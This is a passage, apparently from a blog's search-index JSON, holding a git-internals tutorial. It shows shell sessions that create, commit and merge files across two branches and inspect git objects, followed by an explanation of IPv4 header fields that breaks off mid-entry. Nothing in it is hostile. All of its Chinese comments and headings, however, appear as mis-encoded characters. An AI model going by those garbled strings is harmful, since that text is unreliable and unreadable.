â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ info\râ””â”€â”€ pack\r13 directories, 12 files\rroot@aliyun:~/blog-delete# git add file4 # æ·»åŠ  file4\rroot@aliyun:~/blog-delete# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a # blob:file4\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ info\râ””â”€â”€ pack\r14 directories, 13 files\rroot@aliyun:~/blog-delete# git commit -m \"add file4 on new-branch\"\r[new-branch c9918ce] add file4 on new-branch\r1 file changed, 1 insertion(+)\rcreate mode 100644 file4\rroot@aliyun:~/blog-delete# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491 # 4:tree\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a # blob:file4\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44 # 4:commit\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ info\râ””â”€â”€ pack\r16 directories, 15 files\rroot@aliyun:~/blog-delete# git cat-file -s 0977 # æ–°åŠ çš„ tree object\r132\rroot@aliyun:~/blog-delete# git cat-file -t 0977\rtree\rroot@aliyun:~/blog-delete# git cat-file -p 0977 # new-branch åˆ†æ”¯ä¸Šæ‰€æœ‰æ–‡ä»¶çš„ snapshot\r100644 blob 55bd0ac4c42e46cd751eb7405e12a35e61425550 file1\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2\r100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3\r100644 blob 1e6fd033863540bfb9eadf22019a6b4b3de7d07a file4\rroot@aliyun:~/blog-delete# git cat-file -s 1e6f # new-branch åˆ†æ”¯æ–°åŠ çš„ file4\r4\rroot@aliyun:~/blog-delete# git cat-file -t 1e6f blob\rroot@aliyun:~/blog-delete# git cat-file -p 1e6f\r444\rroot@aliyun:~/blog-delete# git cat-file -s c991 # æ–°çš„ commit object\r208\rroot@aliyun:~/blog-delete# git cat-file -t c991\rcommit\rroot@aliyun:~/blog-delete# git cat-file -p c991\rtree 0977e7b9e8643eaa75b679d7e82b048723e9f491 # æœ¬æ¬¡ç”Ÿæˆçš„ tree object\rparent ce907fabd08138058b05428d7cac017507b33c44 # ä¸Šä¸€æ¬¡ commit\rauthor root \u003croot@aliyun\u003e 1586330993 +0800\rcommitter root \u003croot@aliyun\u003e 1586330993 +0800\radd file4 on new-branch # git commit-m çš„ä¿¡æ¯\rroot@aliyun:~/blog-delete-new-branch-file4# git checkout master # åˆ‡æ¢åˆ° master\rSwitched to branch 'master'\rroot@aliyun:~/blog-delete-new-branch-file4# ls # æŸ¥çœ‹ master åˆ†æ”¯çš„æ–‡ä»¶\rfile2 file3\rroot@aliyun:~/blog-delete-new-branch-file4# tree .git/objects/ # åœ¨ master åˆ†æ”¯æŸ¥çœ‹ objects\r.git/objects/ # å’Œåœ¨ new-branch åˆ†æ”¯ä¸Šçœ‹åˆ°çš„ä¸€æ ·\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ info\râ””â”€â”€ pack\r16 directories, 15 files new-branch åˆ†æ”¯æ·»åŠ  file4 å›¾è§£ master åˆ†æ”¯æ·»åŠ  file5 master åˆ†æ”¯æ·»åŠ  file5 æ­¥éª¤ root@aliyun:~# cp -r blog-delete blog-delete-master-file5 # å¤åˆ¶ä¸€ä»½\rroot@aliyun:~# cd blog-delete-master-file5/\rroot@aliyun:~/blog-delete-master-file5# ls\rfile1 file2 file3 file4\rroot@aliyun:~/blog-delete-master-file5# git branch --list master\r* new-branch\rroot@aliyun:~/blog-delete-master-file5# git checkout master # åˆ‡æ¢åˆ° master\rSwitched to branch 'master'\rroot@aliyun:~/blog-delete-master-file5# echo 555 \u003e file5 åˆ›å»º file5\rroot@aliyun:~/blog-delete-master-file5# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ info\râ””â”€â”€ pack\r16 directories, 15 files\rroot@aliyun:~/blog-delete-master-file5# git add file5 root@aliyun:~/blog-delete-master-file5# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 37\râ”‚Â â””â”€â”€ 49383ded246790596d2f39db4dd8b71f525bbc\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ info\râ””â”€â”€ pack\r17 directories, 16 files\rroot@aliyun:~/blog-delete-master-file5# git commit -m \"add file5 on master\"\r[master 3de903f] add file5 on master\r1 file changed, 1 insertion(+)\rcreate mode 100644 file5\rroot@aliyun:~/blog-delete-master-file5# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 37\râ”‚Â â””â”€â”€ 49383ded246790596d2f39db4dd8b71f525bbc # blob:file5\râ”œâ”€â”€ 3d\râ”‚Â â””â”€â”€ e903f0c523d57b4880be68bacb1eaa1195ebac #5:commit\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ f5\râ”‚Â â””â”€â”€ 4ecef60b4376ae5531032cbeaade01184da4fa # 5:tree\râ”œâ”€â”€ info\râ””â”€â”€ pack\r19 directories, 18 files\rroot@aliyun:~/blog-delete-master-file5# git cat-file -t 3de90 # æœ¬æ¬¡çš„ commit object\rcommit\rroot@aliyun:~/blog-delete-master-file5# git cat-file -s 3de90\r204\rroot@aliyun:~/blog-delete-master-file5# git cat-file -p 3de90\rtree f54ecef60b4376ae5531032cbeaade01184da4fa\rparent f24e8b6fb771347156b615c795f7fd886dc49088\rauthor root \u003croot@aliyun\u003e 1586340888 +0800\rcommitter root \u003croot@aliyun\u003e 1586340888 +0800\radd file5 on master\rroot@aliyun:~/blog-delete-master-file5# git cat-file -t f54ece # æœ¬æ¬¡çš„ tree objet\rtree\rroot@aliyun:~/blog-delete-master-file5# git cat-file -s f54ece\r99\rroot@aliyun:~/blog-delete-master-file5# git cat-file -p f54ece\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 # master åˆ†æ”¯ä¸Šçš„ file2\r100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3 # master åˆ†æ”¯ä¸Šçš„ file3\r100644 blob 3749383ded246790596d2f39db4dd8b71f525bbc file5 # master åˆ†æ”¯ä¸Šçš„ file5\rroot@aliyun:~/blog-delete-master-file5# git cat-file -t 374938 # file5\rblob\rroot@aliyun:~/blog-delete-master-file5# git cat-file -s 374938\r4\rroot@aliyun:~/blog-delete-master-file5# git cat-file -p 374938\r555 master åˆ†æ”¯æ·»åŠ  file5 å›¾è§£ master åˆ†æ”¯åˆå¹¶åˆ° new-branch åˆ†æ”¯ master åˆ†æ”¯åˆå¹¶åˆ° new-branch åˆ†æ”¯æ­¥éª¤ root@aliyun:~# cp -r blog-delete-master-file5/ blog-delete-file4-file5-merge\rroot@aliyun:~# cd blog-delete-file4-file5-merge/\rroot@aliyun:~/blog-delete-file4-file5-merge# git branch --list\r* master\rnew-branch\rroot@aliyun:~/blog-delete-file4-file5-merge# tree .git/objects/\r09/ 1e/ 2e/ 37/ 3d/ 55/ 58/ 61/ 73/ b7/ ba/ c2/ c9/ ce/ d9/ f2/ f5/ info/ pack/ root@aliyun:~/blog-delete-file4-file5-merge# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 37\râ”‚Â â””â”€â”€ 49383ded246790596d2f39db4dd8b71f525bbc\râ”œâ”€â”€ 3d\râ”‚Â â””â”€â”€ e903f0c523d57b4880be68bacb1eaa1195ebac\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ f5\râ”‚Â â””â”€â”€ 4ecef60b4376ae5531032cbeaade01184da4fa\râ”œâ”€â”€ info\râ””â”€â”€ pack\r19 directories, 18 files\rroot@aliyun:~/blog-delete-file4-file5-merge# git checkout new-branch # åˆ‡æ¢åˆ° new-branch\rSwitched to branch 'new-branch'\rroot@aliyun:~/blog-delete-file4-file5-merge# git merge master # æŠŠ master åˆ†æ”¯åˆå¹¶åˆ°å½“å‰åˆ†æ”¯ï¼Œä¹Ÿå°±æ˜¯ new-branch åˆ†æ”¯\rRemoving file1 # master åˆ†æ”¯ä¸Šåˆ é™¤äº† file1ï¼Œnew-branch åˆ†æ”¯åˆå¹¶æ—¶ä¹Ÿä¼šåˆ æ‰ã€‚\rMerge made by the 'recursive' strategy.\rfile1 | 1 -\rfile5 | 1 +\r2 files changed, 1 insertion(+), 1 deletion(-)\rdelete mode 100644 file1\rcreate mode 100644 file5\rroot@aliyun:~/blog-delete-file4-file5-merge# tree .git/objects/\r.git/objects/\râ”œâ”€â”€ 09\râ”‚Â â””â”€â”€ 77e7b9e8643eaa75b679d7e82b048723e9f491\râ”œâ”€â”€ 1e\râ”‚Â â””â”€â”€ 6fd033863540bfb9eadf22019a6b4b3de7d07a\râ”œâ”€â”€ 2e\râ”‚Â â””â”€â”€ 799a48d8c045b814c3862af40dea98bdde790a\râ”œâ”€â”€ 37\râ”‚Â â””â”€â”€ 49383ded246790596d2f39db4dd8b71f525bbc\râ”œâ”€â”€ 3d\râ”‚Â â””â”€â”€ e903f0c523d57b4880be68bacb1eaa1195ebac\râ”œâ”€â”€ 4f\râ”‚Â â””â”€â”€ ed41461bcfd7157b71d757b2fe70e3d7317f94 # 6:tree åˆå¹¶ç”Ÿæˆçš„ tree object\râ”œâ”€â”€ 55\râ”‚Â â”œâ”€â”€ 8e28c67089eea9bdfbfd748d32baa8f2ce944e\râ”‚Â â””â”€â”€ bd0ac4c42e46cd751eb7405e12a35e61425550\râ”œâ”€â”€ 58\râ”‚Â â””â”€â”€ c9bdf9d017fcd178dc8c073cbfcbb7ff240d6c\râ”œâ”€â”€ 61\râ”‚Â â””â”€â”€ 74c3edb1e8dc4f1692b69fd43c8c6af85ce560\râ”œâ”€â”€ 73\râ”‚Â â””â”€â”€ 622e96d5b5389d63dd74e3c40db9d4c4296ff5\râ”œâ”€â”€ b7\râ”‚Â â””â”€â”€ 2118da210e8e3f4127cfc16cc819eff58e42e3\râ”œâ”€â”€ ba\râ”‚Â â””â”€â”€ 61ba35d824408f8135ec77b7efdcdfc0281fba\râ”œâ”€â”€ c2\râ”‚Â â””â”€â”€ 00906efd24ec5e783bee7f23b5d7c941b0c12c\râ”œâ”€â”€ c9\râ”‚Â â””â”€â”€ 918cea80e46648c4e98da5b1c4b072f0794795\râ”œâ”€â”€ ce\râ”‚Â â””â”€â”€ 907fabd08138058b05428d7cac017507b33c44\râ”œâ”€â”€ d9\râ”‚Â â””â”€â”€ 64f468f776fac72a049a884ae24e7dbb838fd0\râ”œâ”€â”€ f2\râ”‚Â â””â”€â”€ 4e8b6fb771347156b615c795f7fd886dc49088\râ”œâ”€â”€ f5\râ”‚Â â””â”€â”€ 4ecef60b4376ae5531032cbeaade01184da4fa\râ”œâ”€â”€ fc\râ”‚Â â””â”€â”€ 094b5b4e7a0f4028c5735d95f844b1aea1a9b6 # 6:commit åˆå¹¶ç”Ÿæˆçš„ commit object\râ”œâ”€â”€ info\râ””â”€â”€ pack\r21 directories, 20 files\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -s 4fed41\r132\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -t 4fed41\rtree\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -p 4fed41\r100644 blob c200906efd24ec5e783bee7f23b5d7c941b0c12c file2 100644 blob 2e799a48d8c045b814c3862af40dea98bdde790a file3\r100644 blob 1e6fd033863540bfb9eadf22019a6b4b3de7d07a file4\r100644 blob 3749383ded246790596d2f39db4dd8b71f525bbc file5\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -s fc094b # æœ¬æ¬¡åˆå¹¶ç”Ÿæˆçš„ commit object\r270\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -t fc094b\rcommit\rroot@aliyun:~/blog-delete-file4-file5-merge# git cat-file -p fc094b\rtree 4fed41461bcfd7157b71d757b2fe70e3d7317f94 # æœ¬æ¬¡åˆå¹¶æ—¶ä¸¤ä¸ªåˆ†æ”¯çš„ snapshot\rparent c9918cea80e46648c4e98da5b1c4b072f0794795 # new branch åˆ†æ”¯åˆå¹¶æ—¶æœ€æ–°çš„ commit\rparent 3de903f0c523d57b4880be68bacb1eaa1195ebac # master åˆ†æ”¯åˆå¹¶æ—¶æœ€æ–°çš„ commit\rauthor root \u003croot@aliyun\u003e 1586344983 +0800\rcommitter root \u003croot@aliyun\u003e 1586344983 +0800\rMerge branch 'master' into new-branch\rroot@aliyun:~/blog-delete-file4-file5-merge# cat .git/refs/heads/new-branch # new branch å·²ç»æŒ‡å‘äº†æ–°ç”Ÿæˆçš„ commit èŠ‚ç‚¹\rfc094b5b4e7a0f4028c5735d95f844b1aea1a9b6\rroot@aliyun:~/blog-delete-file4-file5-merge# cat .git/refs/heads/master # master åˆ†æ”¯æ²¡æœ‰å‘ç”Ÿæ”¹å˜\r3de903f0c523d57b4880be68bacb1eaa1195ebac\rroot@aliyun:~/blog-delete-file4-file5-merge# cat .git/logs/refs/heads/new-branch # new branch åˆ†æ”¯ log\r0000000000000000000000000000000000000000 558e28c67089eea9bdfbfd748d32baa8f2ce944e root \u003croot@aliyun\u003e 1578037705 +0800 branch: Created from master\r558e28c67089eea9bdfbfd748d32baa8f2ce944e ce907fabd08138058b05428d7cac017507b33c44 root \u003croot@aliyun\u003e 1578039532 +0800 commit: add file3 on new-branch\rce907fabd08138058b05428d7cac017507b33c44 c9918cea80e46648c4e98da5b1c4b072f0794795 root \u003croot@aliyun\u003e 1586330993 +0800 commit: add file4 on new-branch\rc9918cea80e46648c4e98da5b1c4b072f0794795 fc094b5b4e7a0f4028c5735d95f844b1aea1a9b6 root \u003croot@aliyun\u003e 1586344983 +0800 merge master: Merge made by the 'recursive' strategy. # æœ¬æ¬¡ merge çš„ log master åˆ†æ”¯åˆå¹¶åˆ° new-branch å›¾è§£ master åˆ†æ”¯åˆå¹¶åˆ° new-branch åˆ†æ”¯å®è´¨ï¼š\nç”Ÿæˆä¸€ä¸ªæ–°çš„ tree object 4f1d41 æŒ‡å‘ master åˆ†æ”¯å’Œ new-branch åˆ†æ”¯å…±æœ‰çš„æ–‡ä»¶ blobã€‚ ç”Ÿæˆä¸€ä¸ªæ–°çš„ commit object fc094b æŒ‡å‘æ–°ç”Ÿæˆçš„ tree object 4f1d41ä»¥åŠåˆå¹¶å‰çš„ master åˆ†æ”¯çš„ commit å’Œ new-branch åˆ†æ”¯çš„ commitã€‚ .git/refs/heads/new-branchæŒ‡å‘æ–°ç”Ÿæˆçš„ commit object fc094bã€‚ .git/logs/refs/heads/new-branch æ·»åŠ æœ¬æ¬¡ merge çš„ logã€‚ .git/refs/heads/master master åˆ†æ”¯çš„æŒ‡å‘å¹¶æ²¡æœ‰å‘ç”Ÿæ”¹å˜ã€‚ Reference git-under-the-hood Bilibili-git-under-the-hood SHA-1 git-branch visual-git-reference visualized-useful-git-commands ","åˆ é™¤-master-åˆ†æ”¯ä¸Šçš„-file1-æ–‡ä»¶ç„¶åæäº¤#åˆ é™¤ master åˆ†æ”¯ä¸Šçš„ file1 æ–‡ä»¶ï¼Œç„¶åæäº¤":"","åˆå¹¶åˆ†æ”¯combine-work#åˆå¹¶åˆ†æ”¯(combine work)":"","ç¬¬ä¸€æ¬¡-git-add--git-commit#ç¬¬ä¸€æ¬¡ git add | git commit":"","ç¬¬ä¸‰æ¬¡-git-add--git-commit#ç¬¬ä¸‰æ¬¡ git add | git commit":"","ç¬¬äºŒæ¬¡-git-add--git-commit#ç¬¬äºŒæ¬¡ git add | git commit":""},"title":"master-git"},"/blog/master-ip/":{"data":{"destination-ip-address32-bits#Destination IP Address(32 bits)":"0x ac:10:79:65 -\u003e 172.16.121.101","flags3-bits#Flags(3 bits)":"0x4 0100\n0 Reserved bit not set 1 Donâ€™t fragment set 0 More fragments not set ","fragment-offset13-bits#Fragment Offset(13 bits)":" This field indicates where in the datagram this fragment belongs. The fragment offset is measured in units of 8 octets (64 bits). The first fragment has offset zero.\n0x000 (0000 0000 0000)","header-checksum16-bits#Header Checksum(16 bits)":"0x2e35","header-length4-bits#Header Length(4 bits)":"0x5(5)","identification16-bits#Identification(16 bits)":"0xd279","ip-datagram#Ip datagram":"","ip-header-format#IP header format":"","ipv4-example#IPV4 example":"","motivation#Motivation":"MotivationThe Internet Protocol is designed for use in interconnected systems of packet-switched computer communication networks. Such a system has been called a â€œcatenetâ€. The internet protocol provides for transmitting blocks of data called datagrams from sources to destinations, where sources and destinations are hosts identified by fixed length addresses. The internet protocol also provides for fragmentation and reassembly of long datagrams, if necessary, for transmission through â€œsmall packetâ€ networks.\nIPv4 is a connectionless protocol for use on packet-switched networks. It operates on a best effort delivery model, in that it does not guarantee delivery, nor does it assure proper sequencing or avoidance of duplicate delivery. These aspects, including data integrity, are addressed by an upper layer transport protocol, such as the Transmission Control Protocol (TCP).","protocal8-bits#Protocal(8 bits)":"0x06 TCP:(6)","references#References":" ip fragmentation and reassembly fragmentation \u0026 reassembly ip é‡ç»„ ","source-ip-address32-bits#Source IP Address(32 bits)":"0x 0a:fe:c9:ad -\u003e 10.254.201.173","time-to-livettl8-bits#Time to Live(TTL)(8 bits)":"0x80 TTL:(128)","total-length16-bits#Total Length(16 bits)":"0x28(40)","type-of-servicetos8-bits#Type Of Service(TOS)(8 bits)":"0x00(0)","version4-bits#version(4 